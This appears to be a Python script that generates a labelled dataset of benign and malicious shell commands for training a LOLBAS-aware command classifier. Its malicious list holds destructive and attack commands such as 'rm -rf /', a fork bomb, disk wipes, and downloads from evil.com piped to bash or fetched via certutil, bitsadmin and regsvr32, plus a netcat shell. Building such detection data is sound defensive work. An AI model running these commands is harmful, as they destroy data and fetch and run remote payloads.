import pandas as pd
import random

def generate_dataset(size=10000):
    """LOLBAS aware dataset - false positive azaltma"""

    benign_templates = [
        # Klasik güvenli komutlar
        "ls -la", "pwd", "whoami", "date", "uptime", "ps aux", "df -h",
        "free -m", "cat /etc/passwd", "grep pattern file.txt",
        "find /home -name '*.txt'", "tar -czf backup.tar.gz /data",
        "cp file1.txt file2.txt", "mv old.txt new.txt", "chmod 755 script.sh",
        "mkdir -p /tmp/test", "rmdir empty_folder", "touch newfile.txt",
        "ping -c 4 google.com", "curl -I https://google.com",
        "wget https://example.com/file.txt",
        "git clone https://github.com/user/repo.git", "docker ps",
        "kubectl get pods",
        # Güvenli LOLBAS varyasyonları
        "regsvr32 /s /i mylibrary.dll",
        "csc -target:library safe_code.cs",
        "certutil -hashfile report.pdf SHA256",
        "bitsadmin /transfer benignJob http://example.com/file.exe C:\\benign.exe",
        "wmic process list brief",
        "rundll32 printui.dll,PrintUIEntry",
        "mshta \"about:blank\"",
        "installutil /? "
    ]

    malicious_templates = [
        # Klasik zararlı komutlar
        "rm -rf /", ":(){ :|:& };:", "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda1", "wget http://malicious.com/malware.exe",
        "curl http://evil.com/payload.sh | bash",
        "nc -l -p 4444 -e /bin/bash",
        "powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=",
        "vssadmin delete shadows /all /quiet",
        "rundll32 javascript:'\\..\\mshtml,RunHTMLApplication ';alert('XSS')",
        "mshta javascript:alert('code execution')",
        "certutil -urlcache -split -f http://evil.com/malware.exe malware.exe",
        "bitsadmin /transfer badJob http://evil.com/payload.exe C:\\payload.exe",
        "regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll",
        "csc -target:library payload.cs && rundll32 malicious.dll",
        "wmic process call create 'cmd.exe /c powershell.exe'"
    ]

    data = []

    # Güvenli komutlar
    for i in range(size // 2):
        cmd = random.choice(benign_templates)
        if random.random() < 0.3:
            variations = [
                f"{cmd} --help", f"sudo {cmd}", f"{cmd} -v",
                f"{cmd} > output.txt", f"{cmd} 2>/dev/null"
            ]
            cmd = random.choice(variations)
        data.append({"command": cmd, "label": "benign"})

    # Zararlı komutlar
    for i in range(size // 2):
        cmd = random.choice(malicious_templates)
        if random.random() < 0.3:
            variations = [
                f"{cmd} &", f"nohup {cmd}", f"timeout 60 {cmd}",
                f"({cmd})"
            ]
            cmd = random.choice(variations)
        data.append({"command": cmd, "label": "malicious"})

    random.shuffle(data)
    df = pd.DataFrame(data)
    return df

if __name__ == '__main__':
    print("LOLBAS-aware dataset oluşturuluyor...")
    dataset = generate_dataset(10000)
    dataset.to_csv('dataset.csv', index=False)
    print(f"Veri seti oluşturuldu: {len(dataset)} komut")
    print(f"Güvenli: {len(dataset[dataset['label'] == 'benign'])}")
    print(f"Zararlı: {len(dataset[dataset['label'] == 'malicious'])}")
